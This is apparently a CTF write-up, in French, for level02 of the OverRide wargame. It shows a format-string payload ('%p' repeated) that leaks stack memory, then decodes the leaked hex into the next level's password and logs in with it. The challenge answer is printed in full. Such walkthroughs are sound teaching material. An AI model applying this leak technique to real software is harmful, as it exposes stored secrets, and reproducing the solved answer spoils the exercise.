@@ -1,0 +1,41 @@
+----> On remarque un petit exploit de printf en fin de code:
+
+level02@OverRide:~$ python -c 'print "AAAA"+"%p."*100' | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+AAAA0x7fffffffe4c0.(nil).0x2e.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.
+0x7fffffffe6b8.0x1f7ff9a08.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.
+0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
+0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x10070252e.
+(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.
+(nil).0x252e702541414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
+0x2e70252e70252e70 does not have access!
+
+----> Notre buffer commence a la 27eme adresse. Mais on remarque aussi que
+----> juste avant 0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.
+----> ressemble a quelque chose, du style une phrase.
+----> On sait qu'en memoire buff2 (ce que contient "/home/users/level03/.pass") se situe juste avant.
+----> ne serait-ce t'y pas notre .pass ecrit en hexa ??? xD
+0x756e505234376848 = unPR47hH
+0x45414a3561733951 = EAJ5as9Q
+0x377a7143574e6758 = 7zqCWNgX
+0x354a35686e475873 = 5J5hnGXs
+0x48336750664b394d = H3gPfK9M
+
+-----> Comme on est en little endian on inverse tout et ca donne
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+----> on test
+level02@OverRide:~$ su level03
+Password:Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+level03@OverRide:~$
+
+
+et ca passs ....
+
